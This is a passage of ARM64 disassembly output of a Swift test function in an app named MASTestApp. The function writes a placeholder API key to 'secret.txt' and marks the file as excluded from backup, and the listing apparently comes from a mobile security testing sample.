0x10000405c      stur xzr, [x29, -0x38]\n\u2502           0x100004060      stur xzr, [x29, -0x48]\n\u2502           0x100004064      stur xzr, [x29, -0x40]\n\u2502           0x100004068      stur xzr, [x29, -0x68]\n\u2502           0x10000406c      stur xzr, [x29, -0x60]\n\u2502           0x100004070      stur xzr, [x29, -0x78]\n\u2502           0x100004074      stur xzr, [x29, -0x70]\n\u2502           0x100004078      mov x0, 0\n\u2502           0x10000407c      sub x8, x29, 0x98\n\u2502           0x100004080      stur x0, [x8, -0x100]\n\u2502           0x100004084      stur xzr, [x29, -0x90]\n\u2502           0x100004088      mov x0, 0\n\u2502           0x10000408c      sub x8, x29, 0x40\n\u2502           0x100004090      stur x0, [x8, -0x100]\n\u2502           0x100004094      bl sym Foundation.URLResourceValues...VMa ; sym.imp.Foundation.URLResourceValues...VMa\n\u2502           0x100004098      mov x8, x0\n\u2502           0x10000409c      sub x9, x29, 0x40\n\u2502           0x1000040a0      ldur x0, [x9, -0x100]\n\u2502           0x1000040a4      sub x9, x29, 0x90\n\u2502           0x1000040a8      stur x8, [x9, -0x100]\n\u2502           0x1000040ac      ldur x8, [x8, -8]\n\u2502           0x1000040b0      sub x9, x29, 0x88\n\u2502           0x1000040b4      stur x8, [x9, -0x100]\n\u2502           0x1000040b8      ldr x8, [x8, 0x40]\n\u2502           0x1000040bc      lsr x9, x8, 0\n\u2502           0x1000040c0      add x9, x9, 0xf\n\u2502           0x1000040c4      and x9, x9, 0xfffffffffffffff0\n\u2502           0x1000040c8      sub x10, x29, 0x80\n\u2502           0x1000040cc      stur x9, [x10, -0x100]\n\u2502           0x1000040d0      adrp x16, segment.__DATA_CONST            ; 0x100010000\n\u2502           0x1000040d4      ldr x16, [x16, 0x90]                      ; 0x100010090\n\u2502                                                                      ; reloc.__chkstk_darwin\n\u2502           0x1000040d8      blr x16\n\u2502           0x1000040dc      sub x9, x29, 0x80\n\u2502           0x1000040e0      ldur x10, [x9, -0x100]\n\u2502           0x1000040e4      mov x9, sp\n\u2502           0x1000040e8      subs x1, x9, x10\n\u2502           0x1000040ec      sub x9, x29, 0x78\n\u2502           0x1000040f0      stur x1, [x9, -0x100]\n\u2502           0x1000040f4      mov sp, x1\n\u2502           0x1000040f8      lsr x8, x8, 0\n\u2502           0x1000040fc      add x8, x8, 0xf\n\u2502           0x100004100      and x9, x8, 0xfffffffffffffff0\n\u2502           0x100004104      sub x8, x29, 0x70\n\u2502           0x100004108      stur x9, [x8, -0x100]\n\u2502           0x10000410c      adrp x16, segment.__DATA_CONST            ; 0x100010000\n\u2502           0x100004110      ldr x16, [x16, 0x90]                      ; 0x100010090\n\u2502                                                                      ; reloc.__chkstk_darwin\n\u2502           0x100004114      blr x16\n\u2502           0x100004118      sub x8, x29, 0x70\n\u2502           0x10000411c      ldur x9, [x8, -0x100]\n\u2502           0x100004120      mov x8, sp\n\u2502           0x100004124      subs x8, x8, x9\n\u2502           0x100004128      sub x9, x29, 0x68\n\u2502           0x10000412c      stur x8, [x9, -0x100]\n\u2502           0x100004130      mov sp, x8\n\u2502           0x100004134      stur x8, [x29, -0x28]\n\u2502           0x100004138      bl sym Foundation...8EncodingVMa          ; sym.imp.Foundation...8EncodingVMa\n\u2502           0x10000413c      sub x8, x29, 0x60\n\u2502           0x100004140      stur x0, [x8, -0x100]\n\u2502           0x100004144      ldur x8, [x0, -8]\n\u2502           0x100004148      sub x9, x29, 0x58\n\u2502           0x10000414c      stur x8, [x9, -0x100]\n\u2502           0x100004150      ldr x8, [x8, 0x40]\n\u2502           0x100004154      lsr x8, x8, 0\n\u2502           0x100004158      add x8, x8, 0xf\n\u2502           0x10000415c      and x9, x8, 0xfffffffffffffff0\n\u2502           0x100004160      sub x8, x29, 0x50\n\u2502           0x100004164      stur x9, [x8, -0x100]\n\u2502           0x100004168      adrp x16, segment.__DATA_CONST            ; 0x100010000\n\u2502           0x10000416c      ldr x16, [x16, 0x90]                      ; 0x100010090\n\u2502                                                                      ; reloc.__chkstk_darwin\n\u2502           0x100004170      blr x16\n\u2502           0x100004174      sub x8, x29, 0x50\n\u2502           0x100004178      ldur x9, [x8, -0x100]\n\u2502           0x10000417c      mov x8, sp\n\u2502           0x100004180      subs x0, x8, x9\n\u2502           0x100004184      sub x8, x29, 0x48\n\u2502           0x100004188      stur x0, [x8, -0x100]\n\u2502           0x10000418c      mov sp, x0\n\u2502           0x100004190      adrp x0, sym.__METACLASS_DATA__TtC10MASTestAppP33_9471609302C95FC8EC1D59DD4CF2A2DB19ResourceBundleClass ; 0x100014000\n\u2502           0x100004194      add x0, x0, 0xe0                          ; 0x1000140e0\n\u2502                                                                      ; sym.Foundation.URL...VSgMD...MD ; int64_t arg1\n\u2502           0x100004198      bl sym.___swift_instantiateConcreteTypeFromMangledName\n\u2502           0x10000419c      mov x8, x0\n\u2502           0x1000041a0      sub x9, x29, 0x40\n\u2502           0x1000041a4      ldur x0, [x9, -0x100]\n\u2502           0x1000041a8      ldur x8, [x8, -8]                         ; 0x1000140d8\n\u2502                                                                      ; reloc.NSObject\n\u2502           0x1000041ac      ldr x8, [x8, 0x40]\n\u2502           0x1000041b0      lsr x8, x8, 0\n\u2502           0x1000041b4      add x8, x8, 0xf\n\u2502           0x1000041b8      and x9, x8, 0xfffffffffffffff0\n\u2502           0x1000041bc      sub x8, x29, 0x38\n\u2502           0x1000041c0      stur x9, [x8, -0x100]\n\u2502           0x1000041c4      adrp x16, segment.__DATA_CONST            ; 0x100010000\n\u2502           0x1000041c8      ldr x16, [x16, 0x90]                      ; 0x100010090\n\u2502                                                                      ; reloc.__chkstk_darwin\n\u2502           0x1000041cc      blr x16\n\u2502           0x1000041d0      sub x8, x29, 0x38\n\u2502           0x1000041d4      ldur x9, [x8, -0x100]\n\u2502           0x1000041d8      mov x8, sp\n\u2502           0x1000041dc      subs x1, x8, x9\n\u2502           0x1000041e0      stur x1, [x29, -0xb8]\n\u2502           0x1000041e4      mov sp, x1\n\u2502           0x1000041e8      bl sym Foundation.URL...VMa               ; sym.imp.Foundation.URL...VMa\n\u2502           0x1000041ec      sub x8, x29, 0x30\n\u2502           0x1000041f0      ldur x1, [x8, -0x100]\n\u2502           0x1000041f4      mov x8, x0\n\u2502           0x1000041f8      sub x9, x29, 0x28\n\u2502           0x1000041fc      ldur x0, [x9, -0x100]\n\u2502           0x100004200      stur x8, [x29, -0xb0]\n\u2502           0x100004204      ldur x8, [x8, -8]\n\u2502           0x100004208      stur x8, [x29, -0xc0]\n\u2502           0x10000420c      ldr x8, [x8, 0x40]\n\u2502           0x100004210      lsr x9, x8, 0\n\u2502           0x100004214      add x9, x9, 0xf\n\u2502           0x100004218      and x9, x9, 0xfffffffffffffff0\n\u2502           0x10000421c      sub x10, x29, 0x20\n\u2502           0x100004220      stur x9, [x10, -0x100]\n\u2502           0x100004224      adrp x16, segment.__DATA_CONST            ; 0x100010000\n\u2502           0x100004228      ldr x16, [x16, 0x90]                      ; 0x100010090\n\u2502                                                                      ; reloc.__chkstk_darwin\n\u2502           0x10000422c      blr x16\n\u2502           0x100004230      sub x9, x29, 0x20\n\u2502           0x100004234      ldur x10, [x9, -0x100]\n\u2502           0x100004238      mov x9, sp\n\u2502           0x10000423c      subs x2, x9, x10\n\u2502           0x100004240      sub x9, x29, 0x18\n\u2502           0x100004244      stur x2, [x9, -0x100]\n\u2502           0x100004248      mov sp, x2\n\u2502           0x10000424c      lsr x9, x8, 0\n\u2502           0x100004250      add x9, x9, 0xf\n\u2502           0x100004254      and x9, x9, 0xfffffffffffffff0\n\u2502           0x100004258      sub x10, x29, 0x10\n\u2502           0x10000425c      stur x9, [x10, -0x100]\n\u2502           0x100004260      adrp x16, segment.__DATA_CONST            ; 0x100010000\n\u2502           0x100004264      ldr x16, [x16, 0x90]                      ; 0x100010090\n\u2502                                                                      ; reloc.__chkstk_darwin\n\u2502           0x100004268      blr x16\n\u2502           0x10000426c      sub x9, x29, 0x10\n\u2502           0x100004270      ldur x10, [x9, -0x100]\n\u2502           0x100004274      mov x9, sp\n\u2502           0x100004278      subs x9, x9, x10\n\u2502           0x10000427c      sub x10, x29, 8\n\u2502           0x100004280      stur x9, [x10, -0x100]\n\u2502           0x100004284      mov sp, x9\n\u2502           0x100004288      stur x9, [x29, -0x30]\n\u2502           0x10000428c      lsr x8, x8, 0\n\u2502           0x100004290      add x8, x8, 0xf\n\u2502           0x100004294      and x9, x8, 0xfffffffffffffff0\n\u2502           0x100004298      stur x9, [x29, -0x100]\n\u2502           0x10000429c      adrp x16, segment.__DATA_CONST            ; 0x100010000\n\u2502           0x1000042a0      ldr x16, [x16, 0x90]                      ; 0x100010090\n\u2502                                                                      ; reloc.__chkstk_darwin\n\u2502           0x1000042a4      blr x16\n\u2502           0x1000042a8      ldur x9, [x29, -0x100]\n\u2502           0x1000042ac      mov x8, sp\n\u2502           0x1000042b0      subs x8, x8, x9\n\u2502           0x1000042b4      stur x8, [x29, -0xf8]\n\u2502           0x1000042b8      mov sp, x8\n\u2502           0x1000042bc      stur x8, [x29, -0x38]\n\u2502           0x1000042c0      stur x0, [x29, -0x48]\n\u2502           0x1000042c4      stur x1, [x29, -0x40]\n\u2502           0x1000042c8      adrp x8, sym.__METACLASS_DATA__TtC10MASTestAppP33_9471609302C95FC8EC1D59DD4CF2A2DB19ResourceBundleClass ; 0x100014000\n\u2502           0x1000042cc      ldr x0, [x8, 0xc0]                        ; 0x1000140c0\n\u2502                                                                      ; reloc.NSFileManager ; void *arg0\n\u2502           0x1000042d0      bl sym.imp.objc_opt_self                  ; void *objc_opt_self(void *arg0)\n\u2502           0x1000042d4      adrp x8, sym.__METACLASS_DATA__TtC10MASTestAppP33_9471609302C95FC8EC1D59DD4CF2A2DB19ResourceBundleClass ; 0x100014000\n\u2502           0x1000042d8      ldr x1, [x8, 0x90]                        ; 0x100014090\n\u2502                                                                      ; section.21.__DATA.__objc_selrefs ; char *selector\n\u2502           0x1000042dc      bl sym.imp.objc_msgSend                   ; void *objc_msgSend(void *instance, char *selector)\n\u2502           0x1000042e0      mov x29, x29\n\u2502           0x1000042e4      bl sym.imp.objc_retainAutoreleasedReturnValue ; void objc_retainAutoreleasedReturnValue(void *instance)\n\u2502           0x1000042e8      stur x0, [x29, -0xf0]\n\u2502           0x1000042ec      adrp x8, sym.__METACLASS_DATA__TtC10MASTestAppP33_9471609302C95FC8EC1D59DD4CF2A2DB19ResourceBundleClass ; 0x100014000\n\u2502           0x1000042f0      ldr x1, [x8, 0x98]                        ; char *selector\n\u2502           0x1000042f4      mov w8, 9\n\u2502           0x1000042f8      mov x2, x8\n\u2502           0x1000042fc      mov w8, 1\n\u2502           0x100004300      mov x3, x8\n\u2502           0x100004304      bl sym.imp.objc_msgSend                   ; void *objc_msgSend(void *instance, char *selector)\n\u2502           0x100004308      mov x29, x29\n\u2502           0x10000430c      bl sym.imp.objc_retainAutoreleasedReturnValue ; void objc_retainAutoreleasedReturnValue(void *instance)\n\u2502           0x100004310      mov x8, x0\n\u2502           0x100004314      ldur x0, [x29, -0xf0]                     ; void *instance\n\u2502           0x100004318      stur x8, [x29, -0xe8]\n\u2502           0x10000431c      bl sym.imp.objc_release                   ; void objc_release(void *instance)\n\u2502           0x100004320      ldur x0, [x29, -0xe8]\n\u2502           0x100004324      ldur x1, [x29, -0xb0]\n\u2502           0x100004328      bl sym Foundation...nconditionallyBridgeFromObjectiveCySayxGSo7NSArrayCSgFZ ; sym.imp.Foundation...nconditionallyBridgeFromObjectiveCySayxGSo7NSArrayCSgFZ\n\u2502           0x10000432c      stur x0, [x29, -0xc8]\n\u2502           0x100004330      stur x0, [x29, -0x50]\n\u2502           0x100004334      ldur x0, [x29, -0x50]                     ; void *arg0\n\u2502           0x100004338      stur x0, [x29, -0xe0]\n\u2502           0x10000433c      bl sym.imp.swift_bridgeObjectRetain       ; void *swift_bridgeObjectRetain(void *arg0)\n\u2502           0x100004340      ldur x8, [x29, -0xe0]\n\u2502           0x100004344      sub x20, x29, 0x58\n\u2502           0x100004348      stur x20, [x29, -0xd0]\n\u2502           0x10000434c      stur x8, [x29, -0x58]\n\u2502           0x100004350      adrp x0, sym.__METACLASS_DATA__TtC10MASTestAppP33_9471609302C95FC8EC1D59DD4CF2A2DB19ResourceBundleClass ; 0x100014000\n\u2502           0x100004354      add x0, x0, 0xe8                          ; 0x1000140e8\n\u2502                                                                      ; sym....sSay10Foundation3URLVGMD ; int64_t arg1\n\u2502           0x100004358      bl sym.___swift_instantiateConcreteTypeFromMangledName\n\u2502           0x10000435c      stur x0, [x29, -0xd8]\n\u2502           0x100004360      bl sym ...sSay10Foundation3URLVGSayxGSlsWl ; sym....sSay10Foundation3URLVGSayxGSlsWl\n\u2502           0x100004364      ldur x8, [x29, -0xb8]\n\u2502           0x100004368      mov x1, x0\n\u2502           0x10000436c      ldur x0, [x29, -0xd8]\n\u2502           0x100004370      bl sym first.Element...zSgvg              ; sym.imp.first.Element...zSgvg\n\u2502           0x100004374      ldur x0, [x29, -0xd0]                     ; void *arg0\n\u2502           0x100004378      bl sym ...sSay10Foundation3URLVGWOh       ; sym....sSay10Foundation3URLVGWOh\n\u2502           0x10000437c      ldur x0, [x29, -0xc8]                     ; void *arg0\n\u2502           0x100004380      bl sym.imp.swift_bridgeObjectRelease      ; void swift_bridgeObjectRelease(void *arg0)\n\u2502           0x100004384      ldur x8, [x29, -0xc0]\n\u2502           0x100004388      ldur x0, [x29, -0xb8]\n\u2502           0x10000438c      ldur x2, [x29, -0xb0]\n\u2502           0x100004390      ldr x8, [x8, 0x30]\n\u2502           0x100004394      mov w1, 1\n\u2502           0x100004398      blr x8\n\u2502           0x10000439c      subs w8, w0, 1\n\u2502           0x1000043a0      cset w8, ne\n\u2502       \u250c\u2500&lt; 0x1000043a4      tbnz w8, 0, 0x10000440c\n\u2502      \u250c\u2500\u2500&lt; 0x1000043a8      b 0x1000043ac\n\u2502      \u2502\u2502   ; CODE XREF from MASTestApp.MastgTest.mastg.completion...FZ @ 0x1000043a8(x)\n\u2502      \u2514\u2500\u2500&gt; 0x1000043ac      sub x8, x29, 0xa0\n\u2502       \u2502   0x1000043b0      ldur x6, [x8, -0x100]\n\u2502       \u2502   0x1000043b4      sub x8, x29, 0xa8\n\u2502       \u2502   0x1000043b8      ldur x3, [x8, -0x100]\n\u2502       \u2502   0x1000043bc      sub x8, x29, 0xb0\n\u2502       \u2502   0x1000043c0      ldur x0, [x8, -0x100]\n\u2502       \u2502   0x1000043c4      sub sp, sp, 0x20\n\u2502       \u2502   0x1000043c8      mov x8, sp\n\u2502       \u2502   0x1000043cc      mov w9, 2\n\u2502       \u2502   0x1000043d0      strb w9, [x8]\n\u2502       \u2502   0x1000043d4      mov w9, 0xd\n\u2502       \u2502   0x1000043d8      str x9, [x8, 8]\n\u2502       \u2502   0x1000043dc      str wzr, [x8, 0x10]\n\u2502       \u2502   0x1000043e0      mov w8, 0xb\n\u2502       \u2502   0x1000043e4      mov x1, x8\n\u2502       \u2502   0x1000043e8      mov w5, 2\n\u2502       \u2502   0x1000043ec      mov x2, x5\n\u2502       \u2502   0x1000043f0      mov w8, 0x39                              ; '9'\n\u2502       \u2502   0x1000043f4      mov x4, x8\n\u2502       \u2502   0x1000043f8      mov w8, 0x1a\n\u2502       \u2502   0x1000043fc      mov x7, x8\n\u2502       \u2502   0x100004400      bl sym _assertionFailure...._4file4line5flagss5NeverOs12StaticStringV_A2HSus6UInt32VtF ; sym.imp._assertionFailure...._4file4line5flagss5NeverOs12StaticStringV_A2HSus6UInt32VtF\n\u2502       \u2502   0x100004404      add sp, sp, 0x20\n\u2502       \u2502   0x100004408      brk 1\n\u2502       \u2502   ; CODE XREF from MASTestApp.MastgTest.mastg.completion...FZ @ 0x1000043a4(x)\n\u2502       \u2514\u2500&gt; 0x10000440c      sub x8, x29, 0x98\n\u2502           0x100004410      ldur x21, [x8, -0x100]\n\u2502           0x100004414      ldur x2, [x29, -0xb0]\n\u2502           0x100004418      ldur x8, [x29, -0xc0]\n\u2502           0x10000441c      ldur x20, [x29, -0xf8]\n\u2502           0x100004420      ldur x1, [x29, -0xb8]\n\u2502           0x100004424      ldr x8, [x8, 0x20]\n\u2502           0x100004428      mov x0, x20\n\u2502           0x10000442c      blr x8\n\u2502           0x100004430      ldur x0, [x29, -0xe8]                     ; void *instance\n\u2502           0x100004434      bl sym.imp.objc_release                   ; void objc_release(void *instance)\n\u2502           0x100004438      adrp x0, sym.imp.swift_getObjCClassMetadata ; 0x10000d000\n\u2502           0x10000443c      add x0, x0, 0xbe6                         ; 0x10000dbe6 ; \"secret.txt\"\n\u2502           0x100004440      mov w8, 0xa\n\u2502           0x100004444      mov x1, x8\n\u2502           0x100004448      mov w8, 1\n\u2502           0x10000444c      sub x9, x29, 0xc4\n\u2502           0x100004450      stur w8, [x9, -0x100]\n\u2502           0x100004454      and w2, w8, 1\n\u2502           0x100004458      bl sym _builtinStringLiteral.utf8CodeUnitCount.isASCII__String: Builtin.Word, B...cfC ; sym.imp._builtinStringLiteral.utf8CodeUnitCount.isASCII__String:_Builtin.Word__B...cfC\n\u2502           0x10000445c      sub x8, x29, 8\n\u2502           0x100004460      ldur x8, [x8, -0x100]\n\u2502           0x100004464      sub x9, x29, 0xd8\n\u2502           0x100004468      stur x1, [x9, -0x100]\n\u2502           0x10000446c      stur x0, [x29, -0x68]\n\u2502           0x100004470      mov x9, x1\n\u2502           0x100004474      stur x9, [x29, -0x60]\n\u2502           0x100004478      bl sym Foundation.URL.appendingPathComponent...CSSF ; sym.imp.Foundation.URL.appendingPathComponent...CSSF\n\u2502           0x10000447c      sub x8, x29, 0xc4\n\u2502           0x100004480      ldur w8, [x8, -0x100]\n\u2502           0x100004484      adrp x0, sym.imp.swift_getObjCClassMetadata ; 0x10000d000\n\u2502           0x100004488      add x0, x0, 0xc00                         ; 0x10000dc00 ; \"MAS_API_KEY=8767086b9f6f976g-a8df76\"\n\u2502           0x10000448c      mov w9, 0x23                              ; '#'\n\u2502           0x100004490      mov x1, x9\n\u2502           0x100004494      and w2, w8, 1\n\u2502           0x100004498      bl sym _builtinStringLiteral.utf8CodeUnitCount.isASCII__String: Builtin.Word, B...cfC ; sym.imp._builtinStringLiteral.utf8CodeUnitCount.isASCII__String:_Builtin.Word__B...cfC\n\u2502           0x10000449c      ldur x8, [x29, -0xc0]\n\u2502           0x1000044a0      ldur x2, [x29, -0xb0]\n\u2502           0x1000044a4      mov x10, x0\n\u2502           0x1000044a8      sub x9, x29, 0x18\n\u2502           0x1000044ac      ldur x0, [x9, -0x100]\n\u2502           0x1000044b0      mov x9, x1\n\u2502           0x1000044b4      sub x11, x29, 8\n\u2502           0x1000044b8      ldur x1, [x11, -0x100]\n\u2502           0x1000044bc      sub x11, x29, 0xd0\n\u2502           0x1000044c0      stur x9, [x11, -0x100]\n\u2502           0x1000044c4      stur x10, [x29, -0x78]\n\u2502           0x1000044c8      mov x11, x9\n\u2502           0x1000044cc      stur x11, [x29, -0x70]\n\u2502           0x1000044d0      sub x20, x29, 0x88\n\u2502           0x1000044d4      stur x10, [x29, -0x88]\n\u2502           0x1000044d8      stur x9, [x29, -0x80]\n\u2502           0x1000044dc      ldr x8, [x8, 0x10]\n\u2502           0x1000044e0      blr x8\n\u2502           0x1000044e4      sub x8, x29, 0x48\n\u2502           0x1000044e8      ldur x8, [x8, -0x100]\n\u2502           0x1000044ec      bl sym Foundation...8EncodingV4utf8ACvgZ  ; sym.imp.Foundation...8EncodingV4utf8ACvgZ\n\u2502           0x1000044f0      bl sym ...sS2SSysWl                       ; sym....sS2SSysWl\n\u2502           0x1000044f4      sub x8, x29, 0xc4\n\u2502           0x1000044f8      ldur w8, [x8, -0x100]\n\u2502           0x1000044fc      sub x9, x29, 0x48\n\u2502           0x100004500      ldur x2, [x9, -0x100]\n\u2502           0x100004504      mov x4, x0\n\u2502           0x100004508      sub x9, x29, 0x18\n\u2502           0x10000450c      ldur x0, [x9, -0x100]\n\u2502           0x100004510      and w1, w8, 1\n\u2502           0x100004514      adrp x3, segment.__DATA_CONST             ; 0x100010000\n\u2502           0x100004518      ldr x3, reloc....SSN                      ; 0x100010428\n\u2502           0x10000451c      bl sym Foundation...bSSAAE8EncodingVtKF   ; sym.imp.Foundation...bSSAAE8EncodingVtKF\n\u2502           0x100004520      sub x8, x29, 0xc0\n\u2502           0x100004524      stur x21, [x8, -0x100]\n\u2502           0x100004528      subs x8, x21, 0\n\u2502           0x10000452c      cset w8, ne\n\u2502           0x100004530      sub x9, x29, 0xb8\n\u2502           0x100004534      stur x21, [x9, -0x100]\n\u2502       \u250c\u2500&lt; 0x100004538      tbnz w8, 0, 0x10000488c\n\u2502      \u250c\u2500\u2500&lt; 0x10000453c      b 0x100004540\n\u2502      \u2502\u2502   ; CODE XREF from MASTestApp.MastgTest.mastg.completion...FZ @ 0x10000453c(x)\n\u2502      \u2514\u2500\u2500&gt; 0x100004540      sub x8, x29, 0xc0\n\u2502       \u2502   0x100004544      ldur x21, [x8, -0x100]\n\u2502       \u2502   0x100004548      sub x8, x29, 0x68\n\u2502       \u2502   0x10000454c      ldur x20, [x8, -0x100]\n\u2502       \u2502   0x100004550      sub x8, x29, 0x60\n\u2502       \u2502   0x100004554      ldur x1, [x8, -0x100]\n\u2502       \u2502   0x100004558      sub x8, x29, 0x48\n\u2502       \u2502   0x10000455c      ldur x0, [x8, -0x100]\n\u2502       \u2502   0x100004560      sub x8, x29, 0x58\n\u2502       \u2502   0x100004564      ldur x8, [x8, -0x100]\n\u2502       \u2502   0x100004568      ldr x8, [x8, 8]\n\u2502       \u2502   0x10000456c      blr x8\n\u2502       \u2502   0x100004570      ldur x8, [x29, -0xc0]\n\u2502       \u2502   0x100004574      sub x9, x29, 0x18\n\u2502       \u2502   0x100004578      ldur x0, [x9, -0x100]\n\u2502       \u2502   0x10000457c      ldur x1, [x29, -0xb0]\n\u2502       \u2502   0x100004580      ldr x8, [x8, 8]\n\u2502       \u2502   0x100004584      blr x8\n\u2502       \u2502   0x100004588      mov x8, x20\n\u2502       \u2502   0x10000458c      bl sym.imp.Foundation.URLResourceValues...VACycfC...ycfC\n\u2502       \u2502   0x100004590      mov w0, 1\n\u2502       \u2502   0x100004594      bl sym Foundation.URLResourceValues.isExcludedFromBackup...Sgvs ; sym.imp.Foundation.URLResourceValues.isExcludedFromBackup...Sgvs\n\u2502       \u2502   0x100004598      sub x8, x29, 8\n\u2502       \u2502   0x10000459c      ldur x20, [x8, -0x100]\n\u2502       \u2502   0x1000045a0      sub x8, x29, 0x88\n\u2502       \u2502   0x1000045a4      ldur x8, [x8, -0x100]\n\u2502       \u2502   0x1000045a8      sub x9, x29, 0x68\n\u2502       \u2502   0x1000045ac      ldur x1, [x9, -0x100]\n\u2502       \u2502   0x1000045b0      sub x9, x29, 0x90\n\u2502       \u2502   0x1000045b4      ldur x2, [x9, -0x100]\n\u2502       \u2502   0x1000045b8      sub x9, x29, 0x78\n\u2502       \u2502   0x1000045bc      ldur x0, [x9, -0x100]\n\u2502       \u2502   0x1000045c0      ldr x8, [x8, 0x10]\n\u2502       \u2502   0x1000045c4      blr x8\n\u2502       \u2502   0x1000045c8      sub x8, x29, 0x78\n\u2502       \u2502   0x1000045cc      ldur x0, [x8, -0x100]\n\u2502       \u2502   0x1000045d0      bl sym Foundation.URL.setResourceValues.URLResource...E0VKF...VKF ; sym.imp.Foundation.URL.setResourceValues.URLResource...E0VKF...VKF\n\u2502       \u2502   0x1000045d4      subs x8, x21, 0\n\u2502       \u2502   0x1000045d8      cset w8, ne\n\u2502       \u2502   0x1000045dc      sub x9, x29, 0xe0\n\u2502       \u2502   0x1000045e0      stur x21, [x9, -0x100]\n\u2502      \u250c\u2500\u2500&lt; 0x1000045e4      tbnz w8, 0, 0x1000048e8\n\u2502     \u250c\u2500\u2500\u2500&lt; 0x1000045e8      b 0x1000045ec\n\u2502     \u2502\u2502\u2502   ; CODE XREF from MASTestApp.MastgTest.mastg.completion...FZ @ 0x1000045e8(x)\n\u2502     \u2514\u2500\u2500\u2500&gt; 0x1000045ec      sub x8, x29, 0x90\n\u2502      \u2502\u2502   0x1000045f0      ldur x1, [x8, -0x100]\n\u2502      \u2502\u2502   0x1000045f4      sub x8, x29, 0x78\n\u2502      \u2502\u2502   0x1000045f8      ldur x0, [x8, -0x100]\n\u2502      \u2502\u2502   0x1000045fc      sub x8, x29, 0x88\n\u2502      \u2502\u2502   0x100004600      ldur x8, [x8, -0x100]\n\u2502      \u2502\u2502   0x100004604      ldr x8, [x8, 8]\n\u2502      \u2502\u2502   0x100004608      sub x9, x29, 0xe8\n\u2502      \u2502\u2502   0x10000460c      stur x8, [x9, -0x100]\n\u2502      \u2502\u2502   0x100004610      blr x8\n\u2502      \u2502\u2502   0x100004614      sub x8, x29, 0x68\n\u2502      \u2502\u2502   0x100004618      ldur x0, [x8, -0x100]\n\u2502      \u2502\u2502   0x10000461c      sub x8, x29, 0x90\n\u2502      \u2502\u2502   0x100004620      ldur x1, [x8, -0x100]\n\u2502      \u2502\u2502   0x100004624      sub x8, x29, 0xe8\n\u2502      \u2502\u2502   0x100004628      ldur x8, [x8, -0x100]\n\u2502      \u2502\u2502   0x10000462c      blr x8\n\u2502     \u250c\u2500\u2500\u2500&lt; 0x100004630      b 0x100004634\n\u2502     \u2502\u2502\u2502   ; CODE XREFS from MASTestApp.MastgTest.mastg.completion...FZ @ 0x100004630(x), 0x100004888(x)\n\u2502    \u250c\u2514\u2500\u2500\u2500&gt; 0x100004634      sub x8, x29, 0x30\n\u2502    \u254e \u2502\u2502   0x100004638      ldur x20, [x8, -0x100]\n\u2502    \u254e \u2502\u2502   0x10000463c      mov x0, x20\n\u2502    \u254e \u2502\u2502   0x100004640      bl sym.imp.swift_retain\n\u2502    \u254e \u2502\u2502   0x100004644      adrp x0, sym.imp.swift_getObjCClassMetadata ; 0x10000d000\n\u2502    \u254e \u2502\u2502   0x100004648      add x0, x0, 0xc50                         ; 0x10000dc50 ; \"File created and isExcludedFromBackup flag set to true\"\n\u2502    \u254e \u2502\u2502   0x10000464c      mov w8, 0x36                              ; '6'\n\u2502    \u254e \u2502\u2502   0x100004650      mov x1, x8\n\u2502    \u254e \u2502\u2502   0x100004654      mov w8, 1\n\u2502    \u254e \u2502\u2502   0x100004658      and w2, w8, 1\n\u2502    \u254e \u2502\u2502   0x10000465c      bl sym _builtinStringLiteral.utf8CodeUnitCount.isASCII__String: Builtin.Word, B...cfC ; sym.imp._builtinStringLiteral.utf8CodeUnitCount.isASCII__String:_Builtin.Word__B...cfC\n\u2502    \u254e \u2502\u2502   0x100004660      sub x8, x29, 0x28\n\u2502    \u254e \u2502\u2502   0x100004664      ldur x8, [x8, -0x100]\n\u2502    \u254e \u2502\u2502   0x100004668      sub x9, x29, 0xf8\n\u2502    \u254e \u2502\u2502   0x10000466c      stur x1, [x9, -0x100]\n\u2502    \u254e \u2502\u2502   0x100004670      blr x8\n\u2502    \u254e \u2502\u2502   0x100004674      sub x8, x29, 0xf8\n\u2502    \u254e \u2502\u2502   0x100004678      ldur x0, [x8, -0x100]                     ; void *arg0\n\u2502    \u254e \u2502\u2502   0x10000467c      bl sym.imp.swift_bridgeObjectRelease      ; void swift_bridgeObjectRelease(void *arg0)\n\u2502    \u254e \u2502\u2502   0x100004680      sub x8, x29, 0x30\n\u2502    \u254e \u2502\u2502   0x100004684      ldur x0, [x8, -0x100]                     ; void *arg0\n\u2502    \u254e \u2502\u2502   0x100004688      bl sym.imp.swift_release                  ; void swift_release(void *arg0)\n\u2502    \u254e \u2502\u2502   0x10000468c      sub x8, x29, 0xd0\n\u2502    \u254e \u2502\u2502   0x100004690      ldur x0, [x8, -0x100]                     ; void *arg0\n\u2502    \u254e \u2502\u2502   0x100004694      bl sym.imp.swift_bridgeObjectRelease      ; void swift_bridgeObjectRelease(void *arg0)\n\u2502    \u254e \u2502\u2502   0x100004698      ldur x8, [x29, -0xc0]\n\u2502    \u254e \u2502\u2502   0x10000469c      sub x9, x29, 8\n\u2502    \u254e \u2502\u2502   0x1000046a0      ldur x0, [x9, -0x100]\n\u2502    \u254e \u2502\u2502   0x1000046a4      ldur x1, [x29, -0xb0]\n\u2502    \u254e \u2502\u2502   0x1000046a8      ldr x8, [x8, 8]\n\u2502    \u254e \u2502\u2502   0x1000046ac      sub x9, x29, 0xf0\n\u2502    \u254e \u2502\u2502   0x1000046b0      stur x8, [x9, -0x100]\n\u2502    \u254e \u2502\u2502   0x1000046b4      blr x8\n\u2502    \u254e \u2502\u2502   0x1000046b8      sub x8, x29, 0xd8\n\u2502    \u254e \u2502\u2502   0x1000046bc      ldur x0, [x8, -0x100]                     ; void *arg0\n\u2502    \u254e \u2502\u2502   0x1000046c0      bl sym.imp.swift_bridgeObjectRelease      ; void swift_bridgeObjectRelease(void *arg0)\n\u2502    \u254e \u2502\u2502   0x1000046c4      ldur x0, [x29, -0xf8]\n\u2502    \u254e \u2502\u2502   0x1000046c8      ldur x1, [x29, -0xb0]\n\u2502    \u254e \u2502\u2502   0x1000046cc      sub x8, x29, 0xf0\n\u2502    \u254e \u2502\u2502   0x1000046d0      ldur x8, [x8, -0x100]\n\u2502    \u254e \u2502\u2502   0x1000046d4      blr x8\n\u2502    \u254e \u2502\u2502   0x1000046d8      sub sp, x29, 0x20\n\u2502    \u254e \u2502\u2502   0x1000046dc      ldp x29, x30, [var_0h_19]\n\u2502    \u254e \u2502\u2502   0x1000046e0      ldp x20, x19, [var_0h_65x10]\n\u2502    \u254e \u2502\u2502   0x1000046e4      ldp x22, x21, [sp], 0x30\n\u2502    \u254e \u2502\u2502   0x1000046e8      ret\n\u2502    \u254e \u2502\u2502   ; CODE XREFS from 